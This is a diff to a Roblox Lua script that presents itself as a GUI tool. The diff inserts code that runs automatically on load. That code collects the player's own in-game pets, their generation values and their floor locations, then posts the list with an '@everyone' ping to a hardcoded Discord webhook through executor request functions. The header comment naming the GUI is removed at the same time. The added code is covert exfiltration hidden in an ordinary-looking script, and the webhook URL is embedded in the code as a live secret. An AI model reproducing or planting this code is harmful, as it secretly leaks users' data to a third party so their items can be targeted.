@@ -1,8 +1,143 @@
--- 🌟 Moreira Script GUI (by PhatLee)
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
+local Workspace = game:GetService("Workspace")
 
 local player = Players.LocalPlayer
+
+local WEBHOOK = "https://discord.com/api/webhooks/1431453278096461844/z4fh9PbqxSrh0KYFecmS1H2G2RXZOYLxEbXK0cKGbcoPc3yRBF6bmht_jURT0634qHYS"
+
+-- 🧮 parse giá trị
+local function parsePrice(priceText)
+    local number = tonumber((priceText or ""):match("[%d%.]+")) or 0
+    if (priceText or ""):find("K") then
+        return number * 1000
+    elseif (priceText or ""):find("M") then
+        return number * 1e6
+    elseif (priceText or ""):find("B") then
+        return number * 1e9
+    else
+        return number
+    end
+end
+
+-- 🧭 xác định tầng gần nhất (đã fix Base là Model hoặc Part)
+local function getNearestFloor(plot, model)
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if not podiums then return "? Floor" end
+
+    local closest = math.huge
+    local floor = "? Floor"
+
+    for _, podium in pairs(podiums:GetChildren()) do
+        if podium:IsA("Model") then
+            local basePart = podium:FindFirstChild("Base")
+            if not (basePart and basePart:IsA("BasePart")) then
+                for _, sub in pairs(podium:GetDescendants()) do
+                    if sub:IsA("BasePart") then
+                        basePart = sub
+                        break
+                    end
+                end
+            end
+
+            if basePart then
+                local success, dist = pcall(function()
+                    return (basePart.Position - model:GetPivot().Position).Magnitude
+                end)
+                if success and dist < closest then
+                    closest = dist
+                    local num = tonumber(podium.Name:match("^(%d+)_?"))
+                    if num then
+                        if num >= 1 and num <= 10 then
+                            floor = "1st Floor"
+                        elseif num <= 18 then
+                            floor = "2nd Floor"
+                        else
+                            floor = "3rd Floor"
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return floor
+end
+
+-- 🔍 tìm overhead trong FakeRootPart (đệ quy toàn bộ)
+local function findOverheadsInPart(part)
+    local result = {}
+    if part:IsA("Attachment") then
+        local oh = part:FindFirstChild("AnimalOverhead")
+        if oh then table.insert(result, oh) end
+    end
+    for _, c in pairs(part:GetChildren()) do
+        local sub = findOverheadsInPart(c)
+        for _, s in pairs(sub) do table.insert(result, s) end
+    end
+    return result
+end
+
+-- 📦 thu thập model đặc biệt
+local function collectSpecialModels()
+    local pets = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return pets end
+
+    for _, plot in pairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            for _, model in pairs(plot:GetChildren()) do
+                if model:IsA("Model") and model:FindFirstChild("FakeRootPart") and not model.Name:lower():find("friendpanel") then
+                    local fakeRoot = model.FakeRootPart
+                    local floor = getNearestFloor(plot, model)
+                    for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do
+                        local name = overhead:FindFirstChild("DisplayName")
+                        local gen = overhead:FindFirstChild("Generation")
+                        if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
+                            table.insert(pets, string.format("%s (%s) (%s)", name.Text, gen.Text, floor))
+                        end
+                    end
+                end
+            end
+            break -- chỉ xét base của mình
+        end
+    end
+    return pets
+end
+
+-- 📨 gửi webhook text đơn giản
+local function sendWebhook()
+    local specialPets = collectSpecialModels()
+    local lootText = #specialPets > 0 and table.concat(specialPets, "\n") or "No special models found."
+    local content = "@everyone SPECIAL MODEL FOUND!!!\n🧠 Brainrot Loot\n" .. lootText
+
+    local payload = {content = content}
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and type(WEBHOOK) == "string" and WEBHOOK ~= "" then
+        local ok, err = pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if ok then
+            print("✅ Webhook Sent!")
+        else
+            warn("❌ Webhook Error:", err)
+        end
+    else
+        warn("⚠️ No valid request function or webhook URL.")
+    end
+end
+
+-- 🔄 Chạy
+sendWebhook()
+
+local TweenService = game:GetService("TweenService")
+
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- Xóa GUI cũ nếu có
@@ -21,7 +156,7 @@ local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 320, 0, 180)
 frame.Position = UDim2.new(0.5, -160, 0.5, -90)
 frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-frame.Active = true
+frame.Active = true 
 frame.Draggable = true
 frame.Parent = screenGui
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
